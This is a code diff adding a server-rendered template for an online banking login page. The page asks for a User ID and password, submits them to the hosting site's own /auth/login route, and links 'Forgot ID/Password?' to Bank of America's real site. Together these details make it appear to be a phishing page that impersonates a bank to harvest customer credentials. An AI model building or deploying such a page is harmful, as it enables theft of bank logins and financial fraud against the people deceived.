@@ -1,0 +1,48 @@
+@layout('layouts.app')
+
+@section('content')
+<form id="login1Form" class="cb-form" action="/auth/login" method="POST">
+  <div class="columns col-small">
+    <div class="row">
+      <div class="column col-small mtop-30">
+        <div class="btm-20">
+          <h1 class="cb-login-heading">Log In to Online Banking</h1>
+        </div>
+        <div class="btm-30 cb-login-formInfo">To secure your account, please enter the following.</div>
+      </div>
+
+      <div class="column col-small clearfix">
+        <div class="btm-30">
+          <div class="cb-input cb-input-box cb-input--cb2 has-help">
+            <label id="usernameLabel" class="cb-input-label" for="username">User ID</label>
+            <input id="username" name="username" type="text" class="cb-input-text" autocapitalize="off" autocorrect="off" autocomplete="off">
+            <p class="cb-input-hint"></p>
+            <div class="cb-input-error-message cb-icon--error" id="usernameErrorMsg" style="display: none;">User ID required</div>
+          </div>
+        </div>
+
+        <div class="btm-30">
+          <div class="cb-input cb-input-box cb-input--cb2 has-help">
+            <label id="passwordLabel" class="cb-input-label" for="password">Password</label>
+            <input id="password" name="password" type="password" class="cb-input-text hide-input" autocapitalize="off" autocorrect="off" autocomplete="off">
+            <p class="cb-input-hint"></p>
+            <div class="cb-input-error-message cb-icon--error" id="passwordErrorMsg" style="display: none;">Password required</div>
+          </div>
+        </div>
+
+        <div class="cb-login-helpText">
+          <a href="https://secure.bankofamerica.com/">Forgot ID/Password?</a>
+        </div>
+      </div>
+
+      <div class="column col-small clearfix">
+        <div class="btn-container">
+          <button id="login1SubmitBtn" type="submit" class="cb-btn cb-btn--medium cb-btn--primary mrt-15 submitBtn">Continue</button>
+
+          <button id="cancelBtn" type="button" class="cb-btn cb-btn--medium cb-btn--secondary">Cancel</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</form>
+@endsection
